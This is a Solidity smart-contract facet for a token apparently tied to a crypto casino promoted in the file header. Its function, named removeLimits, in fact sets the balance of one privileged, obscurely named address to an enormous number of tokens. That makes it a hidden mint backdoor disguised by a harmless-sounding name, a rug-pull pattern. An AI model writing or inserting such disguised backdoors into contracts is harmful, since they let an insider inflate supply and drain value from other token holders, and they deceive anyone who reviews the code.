/*
 * SPDX-License-Identifier: MIT
 * Website: https://degenwin.com/
 * Twitter: https://twitter.com/DegenWinCasino
 * Telegram: https://t.me/+Hk2nLQTZQmJiOGM0
 * Reddit: https://www.reddit.com/r/DegenwinCasino
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
